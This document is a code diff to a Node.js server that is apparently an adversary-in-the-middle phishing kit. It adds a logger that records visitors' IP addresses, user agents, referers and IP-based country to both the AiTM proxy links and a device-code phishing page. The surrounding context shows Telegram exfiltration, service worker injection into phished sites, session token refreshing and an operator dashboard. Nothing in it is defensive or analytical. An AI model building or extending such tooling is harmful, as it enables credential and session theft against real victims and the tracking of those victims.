@@ -7,6 +7,7 @@
 // ✅ Health check endpoint added
 // ✅ Proxy routing FIXED
 // ✅ WebSocket FIXED (order + path)
+// ✅ Visit logging for BOTH AiTM links AND device page
 // ✅ All features intact
 // ============================================================
 
@@ -120,6 +121,50 @@ const USER_AGENTS = [
 ];
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
+
+// ── 🔥 VISIT LOGGER (reusable for AiTM + Device + any page) ──
+function logVisit(req, pageType = 'page') {
+    try {
+        const ip = req.headers['cf-connecting-ip'] || 
+                   req.headers['x-real-ip'] || 
+                   req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+        const userAgent = req.headers['user-agent'] || 'Unknown';
+        const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
+        const url = req.url || '/';
+        
+        const visitEntry = {
+            timestamp: new Date().toISOString(),
+            ip,
+            userAgent,
+            referer,
+            url,
+            pageType,
+            countryCode: 'UN'
+        };
+        
+        // Try to get country from IP (async but non-blocking)
+        if (axios && ip !== 'Unknown') {
+            axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
+                .then(res => {
+                    if (res.data?.country_code) {
+                        visitEntry.countryCode = res.data.country_code;
+                        const updated = { ...visitEntry, countryCode: res.data.country_code };
+                        fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(updated) + '\n');
+                    }
+                })
+                .catch(() => {
+                    fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
+                });
+        } else {
+            fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
+        }
+        
+        console.log(`👁️ Visit logged: ${pageType} | IP: ${ip} | URL: ${url}`);
+    } catch (e) {
+        console.error('Visit log error:', e.message);
+    }
+}
 
 // ============================================================
 // 📤 TELEGRAM EXFILTRATION
@@ -906,12 +951,12 @@ const server = http.createServer(async (req, res) => {
 
     // ── 🔥 DEVICE CODE PAGES (public, no auth) ──
     if (url === '/device' || url === '/device/') {
+        logVisit(req, 'device');  // 🔥 LOG DEVICE VISITS
         const devicePath = path.join(__dirname, 'public', 'device_code.html');
         if (fs.existsSync(devicePath)) {
             res.writeHead(200, { 'Content-Type': 'text/html' });
             fs.createReadStream(devicePath).pipe(res);
         } else {
-            // Fallback device page
             res.writeHead(200, { 'Content-Type': 'text/html' });
             res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
         }
@@ -2085,13 +2130,14 @@ function proxyHandler(req, res) {
 
 refreshTokensDaemon();
 
-// ── The actual proxy server (with page‑load notification + SW registration) ──
+// ── The actual proxy server (with page‑load notification + SW registration + visit logging) ──
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
     // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+        logVisit(clientRequest, 'aitm');  // 🔥 LOG AITM VISITS
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -2453,7 +2499,6 @@ if (WebSocket) {
         if (fs.existsSync(LOGS_DIRECTORY)) {
             fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
                 if (filename && filename.endsWith('.log') && eventType === 'rename') {
-                    // Small delay to ensure file is fully written
                     setTimeout(() => {
                         if (fs.existsSync(path.join(LOGS_DIRECTORY, filename))) {
                             broadcastNewLog(filename);
@@ -2476,6 +2521,7 @@ server.listen(PORT, '::', () => {
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
+    console.log(`👁️ Visit Logging: AiTM + Device pages`);
     console.log(`📤 Page‑load notifications: ACTIVE`);
     console.log(`📤 Telegram exfil: ACTIVE`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
